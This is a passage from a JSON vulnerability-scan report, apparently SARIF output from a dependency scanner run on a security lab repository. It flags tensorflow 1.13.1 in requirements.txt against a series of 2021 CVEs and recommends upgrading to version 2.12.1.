            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41223 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41223](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41223)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "03e293749aeb5bf8a6eb2e19f475a5930f7358cb"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41207",
          "ruleIndex": 239,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41207 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41207)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5ad99c52c0dd0da6d0a30f5761d55fc125ded492"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41208",
          "ruleIndex": 240,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41208 (severity: critical, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41208](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41208)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "247469602004c82c609545900a683ae93c000577"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41222",
          "ruleIndex": 241,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41222 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41222](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41222)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "cd4e3e641c31628e437ac68d3a799fac53536258"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41227",
          "ruleIndex": 242,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41227 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41227](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41227)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8fd0e19c5ecbc4514c1c03054a0be77a86a6b4a5"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41196",
          "ruleIndex": 243,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41196 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41196](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41196)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5da03cefbbbc83a8f1732b2039152f2075b03d10"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41226",
          "ruleIndex": 244,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41226 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41226](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41226)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7f9bbee4eeebfdc64d43d583b2aa48300899348b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41221",
          "ruleIndex": 245,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41221 (severity: high, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41221](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41221)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ba7de3f5c35b860dfb2e54f4419ee2ef3444be84"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41206",
          "ruleIndex": 246,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41206 (severity: high, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41206](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41206)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0b5252e57347a07f575c1ed0a151d7f92f64b28a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41199",
          "ruleIndex": 247,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41199 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41199)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0aa2a02040a74be0fcc9169aacd0262d72d4094b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41195",
          "ruleIndex": 248,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41195 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41195)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e31c52139aa318c366b1773069b52789a6aa78a8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41214",
          "ruleIndex": 249,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41214 (severity: high, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41214](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41214)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e7b7d8359c184e7a2b9983a4fc2815c2f6ef7be1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41202",
          "ruleIndex": 250,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41202 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41202)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5b2a3674f4eec108d202e1d21b10aa118a148b3e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41210",
          "ruleIndex": 251,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41210 (severity: high, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41210](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41210)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3cc691620ffac8d99cfc0dde923a610e577bab05"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41198",
          "ruleIndex": 252,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41198 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41198)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "bc48c4e2605a11cccbfbc41cab33b1af8986e9ff"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41203",
          "ruleIndex": 253,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41203 (severity: high, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41203)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "62fcb8fb034570981bc99a3cc63f0657e3e61887"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41215",
          "ruleIndex": 254,
          "level": "warning",
          "message": {
